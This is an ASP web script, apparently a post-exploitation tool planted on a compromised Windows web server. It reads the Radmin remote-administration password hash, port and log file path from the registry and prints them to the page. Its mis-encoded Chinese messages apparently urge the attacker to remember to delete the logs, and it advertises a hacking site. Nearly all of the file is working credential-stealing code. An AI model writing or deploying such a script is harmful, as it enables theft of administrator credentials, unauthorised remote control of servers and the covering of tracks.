<% 
'========================================Main====================================== 
Set WSH= Server.CreateObject("WSCRIPT.SHELL") 
RadminPath="HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\" 
Parameter="Parameter" 
Port = "Port" 
path="LogFilePath"
ParameterArray=WSH.REGREAD(RadminPath & Parameter ) 
Response.write "The Result of Radmin Hash" 
Response.write "</br>"
Response.write "" 
Response.write Parameter&":" 

'=========== ReadPassWord ========= 
If IsArray(ParameterArray) Then 
For i = 0 To UBound(ParameterArray) 
If Len (hex(ParameterArray(i)))=1 Then 
strObj = strObj & "0" & CStr(Hex(ParameterArray(i))) 
Else 
strObj = strObj & Hex(ParameterArray(i)) 
End If 
Next 
response.write Lcase(strobj) 
Response.write "</br>"
Else 
response.write "Error! Can't Read!" 
End If 
Response.write "" 
'=========== ReadPort ========= 
PortArray=WSH.REGREAD(RadminPath & Port ) 
If IsArray(PortArray) Then 
Response.write Port &":" 
Response.write hextointer(CStr(Hex(PortArray(1)))&CStr(Hex(PortArray(0)))) 
Response.write "<br>"
Else 
Response.write "Error! Can't Read!" 
End If 
'============================��־�ļ��洢��ַ==================
Rpath=WSH.REGREAD(RadminPath & path ) 
Response.write"��־�ļ��洢��ַλ��"
Response.write Rpath
Response.write "<br>"
Response.write"��־һ��Ҫ�ǵ�ɾ��Ŷ!Ҫ����������Ĵ�ƨ�ɿ�"
Response.write" ��ӭ��ȥwww.antian365.com����"
'=======================================hex TO int=================================== 
Function hextointer(strin) 
Dim i, j, k, result 
result = 0 
For i = 1 To Len(strin) 
If Mid(strin, i, 1) = "f" or Mid(strin, i, 1) ="F" Then 
j = 15 
End If 
If Mid(strin, i, 1) = "e" or Mid(strin, i, 1) = "E" Then 
j = 14 
End If 
If Mid(strin, i, 1) = "d" or Mid(strin, i, 1) = "D" Then 
j = 13 
End If 
If Mid(strin, i, 1) = "c" or Mid(strin, i, 1) = "C" Then 
j = 12 
End If 
If Mid(strin, i, 1) = "b" or Mid(strin, i, 1) = "B" Then 
j = 11 
End If 
If Mid(strin, i, 1) = "a" or Mid(strin, i, 1) = "A" Then 
j = 10 
End If 
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
j = CInt(Mid(strin, i, 1)) 
End If 
For k = 1 To Len(strin) - i 
j = j * 16 
Next 
result = result + j 
Next 
hextointer = result 
End Function 
'====================================== End ====================================== 
%> 